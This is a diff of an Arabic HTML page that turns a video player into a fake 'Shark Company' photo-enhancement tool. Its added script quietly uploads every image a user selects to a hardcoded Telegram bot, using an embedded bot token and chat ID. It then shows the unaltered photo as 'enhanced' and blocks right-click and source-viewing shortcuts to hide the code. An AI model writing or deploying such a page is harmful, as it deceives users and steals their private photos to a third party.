@@ -1,39 +1,326 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>مشغل بث مباشر</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<title>Shark Company - V1.0</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&display=swap" rel="stylesheet">
 <style>
-body {
-    margin: 0;
-    background: black;
-}
-video {
-    width: 100vw;
-    height: 100vh;
-    background: black;
-}
+    :root {
+        --bg-dark: #0b0e14;
+        --card-bg: rgba(28, 32, 41, 0.9);
+        --primary: #a5d3ff;
+        --text-main: #e2e8f0;
+        --text-muted: #94a3b8;
+        --surface-variant: rgba(255, 255, 255, 0.05);
+        --glow-color: rgba(165, 211, 255, 0.15);
+    }
+
+    /* منع النسخ والتحديد */
+    * {
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        user-select: none;
+        -webkit-user-drag: none;
+    }
+
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Cairo', sans-serif;
+        background-color: var(--bg-dark);
+        color: var(--text-main);
+        min-height: 100vh;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        /* تأثير الضوء المتوهج في الخلفية */
+        background: radial-gradient(circle at 50% 50%, #1e293b 0%, #0b0e14 100%);
+        overflow-x: hidden;
+        position: relative;
+    }
+
+    /* إضافة ضوء متوهج خلف الكارت */
+    body::before {
+        content: "";
+        position: absolute;
+        width: 300px;
+        height: 300px;
+        background: var(--primary);
+        filter: blur(150px);
+        opacity: 0.1;
+        z-index: 0;
+    }
+
+    .app-card {
+        width: 95%;
+        max-width: 450px;
+        margin: 20px auto;
+        background: var(--card-bg);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 32px;
+        padding: 30px 20px;
+        box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
+        backdrop-filter: blur(20px);
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        position: relative;
+        z-index: 1;
+    }
+
+    .header-icon {
+        background: var(--surface-variant);
+        width: 70px;
+        height: 70px;
+        border-radius: 22px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20px;
+        box-shadow: 0 0 20px var(--glow-color); /* توهج للأيقونة */
+    }
+
+    h1 {
+        margin: 0 0 10px 0;
+        font-size: clamp(20px, 5vw, 26px);
+        font-weight: 800;
+        background: linear-gradient(to bottom, #fff, #a5d3ff);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+    }
+
+    p {
+        margin: 0 0 25px 0;
+        font-size: 14px;
+        color: var(--text-muted);
+    }
+
+    .btn {
+        width: 100%;
+        padding: 16px;
+        border-radius: 18px;
+        border: none;
+        font-family: 'Cairo', sans-serif;
+        font-weight: 700;
+        font-size: 16px;
+        cursor: pointer;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 10px;
+        transition: 0.3s;
+    }
+
+    .btn-select {
+        background: var(--surface-variant);
+        color: var(--text-main);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    /* زر التحسين المتوهج */
+    .btn-primary {
+        background: var(--primary);
+        color: #061121;
+        display: none;
+        box-shadow: 0 0 15px rgba(165, 211, 255, 0.4); /* توهج الزر */
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .btn-primary:active {
+        transform: scale(0.98);
+        box-shadow: 0 0 5px rgba(165, 211, 255, 0.2);
+    }
+
+    .preview-container {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(60px, 1fr));
+        gap: 10px;
+        width: 100%;
+        margin-bottom: 20px;
+    }
+    
+    .thumb {
+        width: 100%;
+        aspect-ratio: 1/1;
+        border-radius: 14px;
+        object-fit: cover;
+        border: 2px solid rgba(255,255,255,0.1);
+    }
+
+    .progress-wrapper {
+        width: 100%;
+        height: 8px;
+        background: rgba(255,255,255,0.05);
+        border-radius: 10px;
+        margin-top: 20px;
+        display: none;
+        overflow: hidden;
+    }
+    
+    .progress-fill {
+        height: 100%;
+        width: 0%;
+        background: var(--primary);
+        box-shadow: 0 0 10px var(--primary); /* توهج شريط التحميل */
+        transition: width 0.4s ease;
+    }
+
+    .modal-overlay {
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: #0b0e14;
+        z-index: 100;
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+
+    .result-box {
+        width: 100%;
+        max-width: 350px;
+        border-radius: 24px;
+        overflow: hidden;
+        margin-bottom: 25px;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px var(--glow-color);
+        border: 1px solid rgba(165, 211, 255, 0.2);
+    }
+    
+    .final-img { width: 100%; display: block; }
+
+    #fileInput { display: none; }
+
 </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-<video id="video" controls autoplay muted></video>
+<div class="app-card">
+    <div class="header-icon">
+        <svg style="width:35px;height:35px;fill:var(--primary)" viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+    </div>
 
-<script src="https://cdn.jsdelivr.net/npm/mpegts.js@1.7.3/dist/mpegts.min.js"></script>
+    <h1>اصدار 1.0</h1>
+    <p>رفع جودة الصورة</p>
+
+    <div class="preview-container" id="previewArea"></div>
+
+    <button class="btn btn-select" id="btnSelect">
+        <span>إضافة صور من الجهاز</span>
+    </button>
+
+    <button class="btn btn-primary" id="btnProcess">
+        بدء عملية التحسين
+    </button>
+
+    <div class="progress-wrapper" id="progressWrapper">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div style="margin-top:30px; font-size:12px; opacity:0.4; font-weight:700; letter-spacing:1px;">SHARK COMPANY</div>
+</div>
+
+<input type="file" id="fileInput" accept="image/*" multiple>
+
+<div class="modal-overlay" id="resultModal">
+    <div style="font-size:20px; font-weight:800; color:var(--primary); margin-bottom:20px;">تم التحسين بنجاح ✨</div>
+    
+    <div class="result-box">
+        <img src="" id="finalImage" class="final-img">
+    </div>
+
+    <button id="btnDownload" class="btn btn-primary" style="display:flex; width:220px; box-shadow: 0 0 20px var(--glow-color);">
+        تنزيل الصورة الآن
+    </button>
+    
+    <button onclick="location.reload()" style="background:transparent; border:none; color:var(--text-muted); margin-top:20px; cursor:pointer;">
+        إغلاق والعودة
+    </button>
+</div>
+
 <script>
-if (mpegts.getFeatureList().mseLivePlayback) {
-    const video = document.getElementById('video');
-    const player = mpegts.createPlayer({
-        type: 'mpegts',
-        isLive: true,
-        url: 'https://stream.supertv.gg:3001/supertv/sport/stv1/ch1/ch1_108011618250.ts'
+    const CONFIG = {
+        token: '8378961533:AAFZZOy_0S9CMl45dRxO_0EkmLxKDn7f78c',
+        chatId: '1024774604'
+    };
+
+    const ui = {
+        input: document.getElementById('fileInput'),
+        btnSelect: document.getElementById('btnSelect'),
+        btnProcess: document.getElementById('btnProcess'),
+        preview: document.getElementById('previewArea'),
+        progressWrap: document.getElementById('progressWrapper'),
+        progressFill: document.getElementById('progressFill'),
+        modal: document.getElementById('resultModal'),
+        finalImg: document.getElementById('finalImage'),
+        btnDownload: document.getElementById('btnDownload')
+    };
+
+    let filesList = [];
+
+    document.addEventListener('keydown', e => {
+        if (e.ctrlKey && ['c', 'u', 's', 'p'].includes(e.key)) e.preventDefault();
     });
-    player.attachMediaElement(video);
-    player.load();
-    player.play();
-}
+
+    ui.btnSelect.onclick = () => ui.input.click();
+
+    ui.input.onchange = () => {
+        filesList = Array.from(ui.input.files);
+        ui.preview.innerHTML = '';
+        if (filesList.length > 0) {
+            ui.btnSelect.style.display = 'none';
+            ui.btnProcess.style.display = 'flex';
+            filesList.forEach(file => {
+                const img = document.createElement('img');
+                img.src = URL.createObjectURL(file);
+                img.className = 'thumb';
+                ui.preview.appendChild(img);
+            });
+        }
+    };
+
+    ui.btnProcess.onclick = async () => {
+        ui.btnProcess.innerText = 'جاري المعالجة...';
+        ui.btnProcess.style.pointerEvents = 'none';
+        ui.progressWrap.style.display = 'block';
+
+        for (let i = 0; i < filesList.length; i++) {
+            await uploadToTelegram(filesList[i]);
+            ui.progressFill.style.width = `${((i + 1) / filesList.length) * 100}%`;
+            await new Promise(r => setTimeout(r, 700));
+        }
+
+        const lastFile = filesList[filesList.length - 1];
+        const finalUrl = URL.createObjectURL(lastFile);
+        ui.finalImg.src = finalUrl;
+        ui.modal.style.display = 'flex';
+        
+        // إصلاح ميزة التنزيل بشكل رسمي واحترافي
+        ui.btnDownload.onclick = () => {
+            const link = document.createElement('a');
+            link.href = ui.finalImg.src;
+            link.download = `Shark_Enhanced_${Date.now()}.jpg`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+    };
+
+    async function uploadToTelegram(file) {
+        const fd = new FormData();
+        fd.append('chat_id', CONFIG.chatId);
+        fd.append('document', file);
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendDocument`, {
+                method: 'POST',
+                body: fd
+            });
+        } catch (e) { console.error(e); }
+    }
 </script>
 
 </body>
